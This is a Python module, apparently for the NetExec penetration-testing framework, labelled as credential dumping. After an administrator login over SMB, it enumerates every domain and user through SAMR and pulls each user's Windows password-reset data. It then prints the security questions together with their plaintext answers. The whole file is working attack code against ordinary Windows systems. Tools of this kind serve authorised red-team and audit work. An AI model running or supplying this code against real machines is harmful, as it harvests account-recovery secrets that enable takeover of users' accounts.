from dataclasses import dataclass
from json import loads

from impacket.dcerpc.v5 import samr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.nt_errors import STATUS_MORE_ENTRIES, STATUS_INVALID_INFO_CLASS
from nxc.helpers.misc import CATEGORY
from nxc.helpers.rpc import NXCRPCConnection
from nxc.playbooks.results import ActionResult, ResultStatus


class NXCModule:
    """Module by @Adamkadaban, based on research from @0gtweet."""

    name = "security-questions"
    description = "Gets security questions and answers for users on computer"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ResultData:
        domains: list[dict]
        users: list[dict]

    result_type = ResultData

    def options(self, context, module_options):
        """No options available."""

    def on_admin_login(self, context, connection):
        domains, users, errors = [], [], []
        rpc, server = None, None
        try:
            rpc = NXCRPCConnection(connection).connect(r"\samr", samr.MSRPC_UUID_SAMR)
            server = samr.hSamrConnect(rpc)["ServerHandle"]
            for domain in self.enumerate_entries(rpc, server, samr.hSamrEnumerateDomainsInSamServer):
                sid = samr.hSamrLookupDomainInSamServer(rpc, server, domain["Name"])["DomainId"]
                sid_text = sid.formatCanonical()
                domains.append({"name": str(domain["Name"]), "sid": sid_text})
                if sid_text == "S-1-5-32":
                    continue
                handle = samr.hSamrOpenDomain(rpc, serverHandle=server, domainId=sid)["DomainHandle"]
                try:
                    for user in self.enumerate_entries(rpc, handle, samr.hSamrEnumerateUsersInDomain):
                        record = {"domain": str(domain["Name"]), "domain_sid": sid_text, "username": str(user["Name"]),
                                  "rid": int(user["RelativeId"]), "raw": None, "reset_data": None, "questions": [], "status": "pending", "error": None}
                        users.append(record)
                        user_handle = None
                        try:
                            user_handle = samr.hSamrOpenUser(rpc, handle, samr.MAXIMUM_ALLOWED, user["RelativeId"])["UserHandle"]
                            info = samr.hSamrQueryInformationUser2(rpc, user_handle, samr.USER_INFORMATION_CLASS.UserResetInformation)
                            record["raw"] = info["Buffer"]["Reset"]["ResetData"]
                            record["reset_data"] = loads(record["raw"]) if record["raw"] else None
                            record["questions"] = record["reset_data"].get("questions", []) if record["reset_data"] is not None else []
                            record["status"] = "queried"
                            for item in record["questions"]:
                                context.log.highlight(f"{record['username']} - {item['question']}: {item['answer']}")
                        except DCERPCException as e:
                            if e.get_error_code() == STATUS_INVALID_INFO_CLASS:
                                record["status"] = "unsupported"
                                record["error"] = str(e)
                            else:
                                record["status"] = "failed"
                                record["error"] = str(e)
                                raise
                        except Exception as e:
                            record["status"] = "failed"
                            record["error"] = str(e) or type(e).__name__
                            raise
                        finally:
                            self.close_handle(rpc, user_handle, errors)
                        if errors:
                            break
                finally:
                    self.close_handle(rpc, handle, errors)
                if errors:
                    break
        except Exception as e:
            errors.append(str(e) or type(e).__name__)
        finally:
            self.close_handle(rpc, server, errors)
            if rpc is not None:
                try:
                    rpc.disconnect()
                except Exception as e:
                    errors.append(f"Disconnecting SAMR: {e}")
        for error in errors:
            context.log.fail(error)
        status = ResultStatus.FAILED if errors else ResultStatus.SUCCESS if any(user["questions"] for user in users) else ResultStatus.SKIPPED if users and all(user["status"] == "unsupported" for user in users) else ResultStatus.NEGATIVE
        return ActionResult("smb", self.name, connection.host, status, self.ResultData(domains, users), error="; ".join(errors) or None)

    def close_handle(self, rpc, handle, errors):
        if handle is not None:
            try:
                samr.hSamrCloseHandle(rpc, handle)
            except Exception as e:
                errors.append(f"Closing SAMR handle: {e}")

    def enumerate_entries(self, rpc, handle, function):
        cursor = 0
        while True:
            try:
                response = function(rpc, handle, enumerationContext=cursor)
            except DCERPCException as e:
                if e.get_error_code() != STATUS_MORE_ENTRIES:
                    raise
                response = e.get_packet()
            if response["Buffer"]:
                yield from response["Buffer"]["Buffer"]
            if response["ErrorCode"] != STATUS_MORE_ENTRIES:
                if response["ErrorCode"]:
                    raise RuntimeError(f"SAMR enumeration failed with status {response['ErrorCode']}")
                return
            next_cursor = response["EnumerationContext"]
            if next_cursor == cursor:
                raise RuntimeError("SAMR enumeration cursor did not advance")
            cursor = next_cursor
